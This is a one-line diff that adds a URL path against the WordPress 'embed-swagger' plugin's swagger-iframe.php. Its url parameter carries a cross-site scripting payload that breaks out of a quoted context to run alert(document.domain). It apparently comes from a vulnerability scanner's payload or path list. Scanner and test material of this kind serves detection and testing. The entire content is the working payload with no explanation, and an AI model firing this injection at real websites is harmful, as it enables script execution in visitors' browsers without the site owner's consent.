@@ -1,0 +1,1 @@
+/wp-content/plugins/embed-swagger/swagger-iframe.php?url=xss://%22-alert(document.domain)-%22
